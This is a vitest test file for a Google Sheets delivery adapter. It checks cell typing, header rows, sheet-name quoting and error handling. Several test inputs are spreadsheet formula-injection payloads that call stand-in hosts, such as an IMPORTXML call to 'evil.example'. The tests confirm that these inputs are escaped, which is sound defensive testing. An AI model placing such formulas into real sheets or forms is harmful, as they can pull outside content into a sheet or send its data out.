import { generateKeyPairSync } from 'node:crypto';
import { INCLUDE_ALL, type DestinationSettings } from '@fieldforms/shared';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { googleSheetsAdapter, toCell } from '../src/destinations/adapters/google-sheets.js';
import { DeliveryError, type OpenConnection } from '../src/destinations/types.js';
import { forgetGoogleTokens, type GoogleConfig } from '../src/destinations/vendors/google-auth.js';
import { exposed, makeCtx, makeEnv } from './fakes/context.js';
import { FakeGoogle } from './fakes/google.js';
import { ANSWERS, model } from './outputs-fixtures.js';

const EMAIL = 'sheets@ff-test.iam.gserviceaccount.com';
const BOOK = 'SpreadsheetId0000000000001';
const SUBMISSION = 'abcdef12-3456-4789-8abc-def012345678';

let fake: FakeGoogle;
let conn: OpenConnection<GoogleConfig>;
let pem: string;
const env = () => makeEnv(fake.endpoints);

type Settings = DestinationSettings<'google_sheets'>;
const settings = (over: Partial<Settings> = {}): Settings => ({
  spreadsheetId: BOOK,
  sheetName: 'Daily log',
  columns: [
    { header: 'Submission', source: { type: 'expression', expression: '_id' } },
    { header: 'Area', source: { type: 'field', field: 'area' } },
    { header: 'Quantity', source: { type: 'expression', expression: 'qty' } },
    { header: 'Checks', source: { type: 'expression', expression: 'checks' } },
    { header: 'Over three', source: { type: 'expression', expression: 'qty > 3' } },
    { header: 'Notes', source: { type: 'field', field: 'notes' } },
  ],
  testWrites: false,
  ...over,
});

async function caught(p: Promise<unknown>): Promise<DeliveryError> {
  try {
    await p;
  } catch (err) {
    expect(err).toBeInstanceOf(DeliveryError);
    return err as DeliveryError;
  }
  throw new Error('expected a DeliveryError');
}

const tab = (name = 'Daily log', book = BOOK) => fake.sheets.get(book)!.tabs.get(name)!;

beforeAll(async () => {
  const { privateKey, publicKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
  pem = privateKey.export({ type: 'pkcs8', format: 'pem' }).toString();
  fake = await new FakeGoogle({ publicKey, clientEmail: EMAIL }).start();
  conn = {
    id: 'c2',
    kind: 'google',
    config: {},
    secrets: {
      serviceAccountJson: JSON.stringify({
        type: 'service_account',
        private_key: pem,
        client_email: EMAIL,
      }),
    },
  };
});

afterAll(() => fake.close());

beforeEach(() => {
  forgetGoogleTokens();
  fake.server.failures = [];
  fake.sheets.set(BOOK, {
    title: 'Inspections',
    tabs: new Map([
      ['Daily log', []],
      ["Bob's log", []],
    ]),
  });
});

describe('Google Sheets cells', () => {
  it('keeps numbers and booleans typed, joins lists and escapes formula-looking text', () => {
    expect(toCell(4)).toBe(4);
    expect(toCell(true)).toBe(true);
    expect(toCell(null)).toBe('');
    expect(toCell(Number.NaN)).toBe('');
    expect(toCell(['floors', 'bins', null])).toBe('floors, bins, ');
    expect(toCell('Kitchen')).toBe('Kitchen');
    expect(toCell('2026-10-06 17:30')).toBe('2026-10-06 17:30');
    for (const risky of ['=1+2', '+1+2', '@SUM(A1)', '-2+3', '\tx', '\rx', '\nx', "'quoted"])
      expect(toCell(risky)).toBe(`'${risky}`);
    expect(toCell(['=HYPERLINK("http://evil")', 'b'])).toBe(`'=HYPERLINK("http://evil"), b`);
    // A plain negative number cannot run; it stays a number for the sheet.
    expect(toCell('-5')).toBe('-5');
    expect(toCell('-5.25')).toBe('-5.25');
    expect((toCell('x'.repeat(60_000)) as string).length).toBe(49_999);
  });
});

describe('Google Sheets destination', () => {
  it('writes the header row on an empty sheet, then appends typed values', async () => {
    const r = await googleSheetsAdapter.deliver(makeCtx(), settings(), conn, env());
    expect(r.outcome).toBe('delivered');
    expect(r.evidence).toMatchObject({ rows: 1, headerWritten: true });
    expect(r.target).toMatchObject({ spreadsheetId: BOOK, sheet: 'Daily log' });
    expect(tab()[0]).toEqual(['Submission', 'Area', 'Quantity', 'Checks', 'Over three', 'Notes']);
    expect(tab()[1]).toEqual([
      SUBMISSION,
      'Kitchen',
      4,
      'floors, bins',
      true,
      expect.stringContaining('Leaking tap'),
    ]);
    const append = fake.appends.at(-1)!;
    expect(append.range).toBe("'Daily log'!A1");
    expect(append.query.get('valueInputOption')).toBe('USER_ENTERED');
    expect(append.query.get('insertDataOption')).toBe('INSERT_ROWS');
    const header = fake.server.log.find((q) => q.method === 'PUT' && q.path.startsWith('/v4/'));
    expect(header?.query.get('valueInputOption')).toBe('RAW');

    // The next submission finds the header and only appends.
    const puts = fake.server.log.filter((q) => q.method === 'PUT').length;
    const again = await googleSheetsAdapter.deliver(makeCtx(), settings(), conn, env());
    expect(again.evidence).toMatchObject({ headerWritten: false });
    expect(again.evidence.warning).toBeUndefined();
    expect(fake.server.log.filter((q) => q.method === 'PUT').length).toBe(puts);
    expect(tab()).toHaveLength(3);
  });

  it('escapes answers that would run as formulas', async () => {
    const m = model(INCLUDE_ALL, {
      answers: { ...ANSWERS, notes: '=IMPORTXML("http://evil.example", "//a")' } as never,
    });
    await googleSheetsAdapter.deliver(makeCtx({ model: m }), settings(), conn, env());
    expect(tab()[1]![5]).toBe(`'=IMPORTXML("http://evil.example", "//a")`);
  });

  it('appends anyway when the header row differs, with a warning in the evidence', async () => {
    tab().push(['Submission', 'Location', 'Quantity']);
    const r = await googleSheetsAdapter.deliver(makeCtx(), settings(), conn, env());
    expect(r.outcome).toBe('delivered');
    expect(r.evidence.headerWritten).toBe(false);
    expect(r.evidence.warning).toBe(
      "The sheet's header row does not match the destination's columns (column 2, 4, 5, 6)",
    );
    expect(tab()[0]).toEqual(['Submission', 'Location', 'Quantity']);
    expect(tab()).toHaveLength(2);
  });

  it('writes one row per repeat-group row with rowsFrom', async () => {
    const s = settings({
      columns: [
        { header: 'Submission', source: { type: 'expression', expression: '_short_id' } },
        { header: 'Item', source: { type: 'field', field: 'item' } },
        { header: 'Double', source: { type: 'expression', expression: 'count * 2' } },
        { header: 'Area', source: { type: 'field', field: 'area' } },
      ],
      rowsFrom: 'items',
    });
    const r = await googleSheetsAdapter.deliver(makeCtx(), s, conn, env());
    expect(r.evidence.rows).toBe(2);
    expect(tab().slice(1)).toEqual([
      ['abcdef12', 'Bleach', 4, 'Kitchen'],
      ['abcdef12', 'Mop & "bucket"', 2, 'Kitchen'],
    ]);

    const empty = model(INCLUDE_ALL, { answers: { ...ANSWERS, items: [] } as never });
    const none = await googleSheetsAdapter.deliver(makeCtx({ model: empty }), s, conn, env());
    expect(none).toMatchObject({ outcome: 'skipped', detail: 'The repeat group has no rows' });
  });

  it('quotes sheet names', async () => {
    await googleSheetsAdapter.deliver(makeCtx(), settings({ sheetName: "Bob's log" }), conn, env());
    expect(fake.appends.at(-1)!.range).toBe("'Bob''s log'!A1");
    expect(tab("Bob's log")).toHaveLength(2);
  });

  it('skips test sends unless test writes are switched on', async () => {
    const test = makeCtx({ test: { tester: { email: 'a@acme.test', name: 'Admin' } } });
    const before = fake.server.log.length;
    const r = await googleSheetsAdapter.deliver(test, settings(), conn, env());
    expect(r).toMatchObject({ outcome: 'skipped', detail: 'Test rows are switched off' });
    expect(r.evidence).toEqual({ rows: 1 });
    expect(fake.server.log.length).toBe(before);
    expect(tab()).toHaveLength(0);

    const on = await googleSheetsAdapter.deliver(test, settings({ testWrites: true }), conn, env());
    expect(on.outcome).toBe('delivered');
    expect(tab()).toHaveLength(2);
  });

  it('a mapping that cannot be evaluated stops before anything is written', async () => {
    const s = settings({
      columns: [{ header: 'Bad', source: { type: 'expression', expression: 'nosuchfield + ' } }],
    });
    await expect(googleSheetsAdapter.deliver(makeCtx(), s, conn, env())).rejects.toThrow();
    expect(tab()).toHaveLength(0);
  });

  it('classifies errors without exposing tokens or bodies', async () => {
    const missingSheet = await caught(
      googleSheetsAdapter.deliver(makeCtx(), settings({ sheetName: 'Nope' }), conn, env()),
    );
    expect(missingSheet).toMatchObject({ permanent: true, errorClass: 'not_found' });
    expect(missingSheet.message).toBe('The sheet was not found in the spreadsheet');
    expect(exposed(missingSheet)).not.toContain('Unable to parse');

    const missingBook = await caught(
      googleSheetsAdapter.deliver(
        makeCtx(),
        settings({ spreadsheetId: 'NoSuchSpreadsheet000000001' }),
        conn,
        env(),
      ),
    );
    expect(missingBook).toMatchObject({ permanent: true, errorClass: 'not_found' });

    fake.sheets.get(BOOK)!.forbidden = true;
    const denied = await caught(googleSheetsAdapter.deliver(makeCtx(), settings(), conn, env()));
    expect(denied).toMatchObject({ permanent: true, errorClass: 'credentials' });
    expect(denied.message).toContain('not shared with the service account');
    fake.sheets.get(BOOK)!.forbidden = false;

    for (const status of [429, 500, 503]) {
      fake.server.fail({ match: (q) => q.path.endsWith(':append'), status });
      const err = await caught(googleSheetsAdapter.deliver(makeCtx(), settings(), conn, env()));
      expect(err, `HTTP ${status}`).toMatchObject({ permanent: false, errorClass: 'unreachable' });
    }
    fake.server.fail({
      match: (q) => q.path.endsWith(':append'),
      status: 403,
      json: {
        error: {
          code: 403,
          status: 'PERMISSION_DENIED',
          details: [{ reason: 'RATE_LIMIT_EXCEEDED' }],
        },
      },
    });
    expect(
      await caught(googleSheetsAdapter.deliver(makeCtx(), settings(), conn, env())),
    ).toMatchObject({ permanent: false });

    for (const e of [missingSheet, missingBook, denied]) {
      expect(exposed(e)).not.toMatch(/ya29\./);
      expect(exposed(e)).not.toContain(pem.split('\n')[2]!);
    }
  });

  it('check reads the sheet and its header row', async () => {
    const empty = await googleSheetsAdapter.check!(settings(), conn, env());
    expect(empty).toMatchObject({
      ok: true,
      summary: "Sheet 'Daily log' in 'Inspections'",
      facts: { spreadsheet: 'Inspections', sheet: 'Daily log' },
    });
    expect(empty.warnings).toEqual([
      'Row 1 is empty: the header row is written with the first delivery',
    ]);

    tab().push(['Submission', 'Area', 'Quantity', 'Checks', 'Over three', 'Notes']);
    expect((await googleSheetsAdapter.check!(settings(), conn, env())).warnings).toEqual([]);
    tab()[0] = ['Submission', 'Area'];
    expect((await googleSheetsAdapter.check!(settings(), conn, env())).warnings?.[0]).toContain(
      'column 3, 4, 5, 6',
    );

    const missing = await googleSheetsAdapter.check!(settings({ sheetName: 'Nope' }), conn, env());
    expect(missing).toMatchObject({
      ok: false,
      summary: "There is no sheet named 'Nope' in 'Inspections'",
    });
  });
});
